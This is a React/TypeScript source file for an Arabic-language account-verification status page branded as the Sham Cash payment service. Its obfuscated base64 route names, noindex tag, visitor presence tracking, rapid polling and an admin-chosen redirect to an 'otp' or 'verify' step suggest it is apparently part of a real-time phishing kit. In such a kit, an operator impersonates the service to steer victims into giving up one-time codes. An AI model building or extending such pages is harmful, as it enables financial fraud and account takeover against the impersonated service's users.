import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import {
  CircleCheckBig,
  Clock,
  FileWarning,
  Loader2,
  LogOut,
  RefreshCw,
  XCircle,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { statusMeta, type RequestStatus } from "@/lib/sham-data";
import { AppScreen } from "@/components/app-screen";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { useRequireName } from "@/lib/require-name";

export const Route = createFileRoute("/cmV2aWV3")({
  head: () => ({
    meta: [
      { name: "robots", content: "noindex, nofollow" },
      { title: "مراجعة طلب التوثيق | شام كاش" },
      {
        name: "description",
        content: "تابع حالة طلب توثيق حسابك لحظة بلحظة حتى صدور قرار الاعتماد أو الرفض.",
      },
      { property: "og:title", content: "مراجعة طلب التوثيق — شام كاش" },
      {
        property: "og:description",
        content: "طلبك قيد المراجعة لدى فريق التوثيق، وستظهر النتيجة هنا فور صدورها.",
      },
    ],
  }),
  component: ReviewPage,
});

type RequestRow = {
  id: string;
  reference: string;
  status: RequestStatus;
  admin_note: string | null;
  admin_route: "/b3Rw" | "/dmVyaWZ5" | null;
  email: string | null;
  created_at: string;
  updated_at: string;
};

const stages: { key: RequestStatus; label: string; text: string }[] = [
  { key: "under_review", label: "قيد المراجعة", text: "يقوم فريق التوثيق بمراجعة بياناتك حالياً." },
  { key: "needs_info", label: "يحتاج معلومات", text: "هناك ملاحظة من الفريق تحتاج معالجتها." },
  { key: "verified", label: "موثق", text: "تمت الموافقة على طلبك وتوثيق حسابك." },
];

function ReviewPage() {
  usePresenceTracker({ page: "/cmV2aWV3" });
  useAdminRedirect();
  useRequireName();
  const navigate = useNavigate();
  const queryClient = useQueryClient();

  const { data, isLoading, isFetching, refetch } = useQuery({
    queryKey: ["my-request"],
    queryFn: async (): Promise<RequestRow | null> => {
      const { data: userData } = await supabase.auth.getUser();
      const userId = userData.user?.id;
      if (!userId) return null;

      const { data: rows, error } = await supabase
        .from("verification_requests")
        .select("id, reference, status, admin_note, admin_route, email, created_at, updated_at")
        .eq("user_id", userId)
        .order("created_at", { ascending: false })
        .limit(1);
      if (error) throw error;
      return (rows?.[0] as RequestRow | undefined) ?? null;
    },
    refetchInterval: 2500,
    refetchIntervalInBackground: true,
  });

  const signOut = async () => {
    await queryClient.cancelQueries();
    queryClient.clear();
    await supabase.auth.signOut();
    navigate({ to: "/YXV0aA", replace: true });
  };

  const status = data?.status ?? "under_review";
  const meta = statusMeta[status];

  return (
    <AppScreen width="lg">
      <div className="grid grid-cols-[minmax(0,1fr)_auto] items-start gap-3">
        <div className="min-w-0">
          <h1 className="text-xl font-bold sm:text-2xl md:text-3xl">مراجعة طلب التوثيق</h1>
          <p className="mt-2 text-sm leading-6 text-muted-foreground">
            يبقى طلبك في هذه الصفحة حتى تصدر الإدارة قرار الاعتماد أو الرفض.
          </p>
        </div>
        <button
          type="button"
          onClick={signOut}
          className="inline-flex min-h-11 shrink-0 items-center gap-2 rounded-xl border border-border px-3 text-xs font-semibold text-muted-foreground transition-colors hover:bg-muted hover:text-foreground"
        >
          <LogOut className="size-4" /> خروج
        </button>
      </div>

      <div className="glass-card mt-6 p-5 sm:p-7">
        {isLoading ? (
          <div className="flex items-center justify-center gap-2 py-12 text-sm text-muted-foreground">
            <Loader2 className="size-4 animate-spin" /> جارٍ تحميل حالة الطلب...
          </div>
        ) : !data ? (
          <p className="py-10 text-center text-sm text-muted-foreground">
            لا يوجد طلب مرتبط بحسابك حتى الآن.
          </p>
        ) : (
          <>
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div>
                <p className="text-xs text-muted-foreground">رقم الطلب</p>
                <p dir="ltr" className="mt-1 text-2xl font-extrabold tracking-widest text-primary">
                  {data.reference}
                </p>
              </div>
              <span
                className={`inline-flex items-center gap-2 rounded-full border px-3 py-1.5 text-xs font-bold ${meta.badge}`}
              >
                <span className={`size-2 rounded-full ${meta.dot}`} /> {meta.label}
              </span>
            </div>

            <div className="mt-6 rounded-2xl border border-border bg-muted/40 p-4 text-center">
              {status === "verified" ? (
                <>
                  <CircleCheckBig className="mx-auto size-9 text-success" />
                  <p className="mt-3 text-base font-bold text-foreground">تم توثيق حسابك بنجاح</p>
                  <p className="mt-1 text-sm text-muted-foreground">
                    وافقت الإدارة على طلبك ويمكنك الآن استخدام كامل خدمات شام كاش.
                  </p>
                </>
              ) : status === "rejected" ? (
                <>
                  <XCircle className="mx-auto size-9 text-destructive" />
                  <p className="mt-3 text-base font-bold text-foreground">تم رفض الطلب</p>
                  <p className="mt-1 text-sm text-muted-foreground">
                    {data.admin_note || "لم يستوفِ الطلب شروط التوثيق. يمكنك التواصل مع الدعم."}
                  </p>
                </>
              ) : status === "needs_info" ? (
                <>
                  <FileWarning className="mx-auto size-9 text-warning" />
                  <p className="mt-3 text-base font-bold text-foreground">مطلوب معلومات إضافية</p>
                  <p className="mt-1 text-sm text-muted-foreground">
                    {data.admin_note || "يرجى تزويدنا بمستندات أوضح لإكمال المراجعة."}
                  </p>
                </>
              ) : (
                <>
                  <Clock className="mx-auto size-9 animate-pulse text-info" />
                  <p className="mt-3 text-base font-bold text-foreground">طلبك قيد المراجعة</p>
                  <p className="mt-1 text-sm text-muted-foreground">
                    {data.admin_note ||
                      "يراجع فريق التوثيق بياناتك الآن. تُحدَّث هذه الصفحة تلقائياً فور صدور القرار."}
                  </p>
                  {data.admin_route ? (
                    <Link
                      to={data.admin_route}
                      className="btn-primary-glow mt-4 inline-flex min-h-11 items-center gap-2 rounded-xl px-5 text-sm font-bold"
                    >
                      المتابعة إلى الخطوة التالية
                    </Link>
                  ) : null}
                </>
              )}
            </div>

            <ol className="mt-6 grid gap-3">
              {stages.map((s, i) => {
                const done =
                  status === "verified" ||
                  (status === "needs_info" && i === 0) ||
                  (status === "under_review" && i === 0) ||
                  (status === "rejected" && i === 0);
                const current =
                  (status === "under_review" && i === 0) ||
                  (status === "needs_info" && i === 1) ||
                  (status === "verified" && i === 2);
                return (
                  <li
                    key={s.key}
                    className={`flex items-start gap-3 rounded-2xl border p-4 ${
                      current ? "border-primary/40 bg-brand-soft" : "border-border bg-card"
                    }`}
                  >
                    <span
                      className={`mt-0.5 flex size-7 shrink-0 items-center justify-center rounded-full text-xs font-bold ${
                        done ? "bg-accent text-accent-foreground" : "bg-muted text-muted-foreground"
                      }`}
                    >
                      {i + 1}
                    </span>
                    <div className="min-w-0">
                      <p className="text-sm font-bold text-foreground">{s.label}</p>
                      <p className="mt-1 text-xs leading-5 text-muted-foreground">{s.text}</p>
                    </div>
                  </li>
                );
              })}
            </ol>

            <div className="mt-6 flex flex-wrap items-center justify-between gap-3 border-t border-border pt-5">
              <p dir="ltr" className="text-xs text-muted-foreground">
                {data.email}
              </p>
              <button
                type="button"
                onClick={() => refetch()}
                className="inline-flex min-h-11 items-center gap-2 rounded-xl border border-border px-4 text-xs font-semibold text-foreground transition-colors hover:bg-muted"
              >
                <RefreshCw className={`size-4 ${isFetching ? "animate-spin" : ""}`} /> تحديث الحالة
              </button>
            </div>
          </>
        )}
      </div>
    </AppScreen>
  );
}
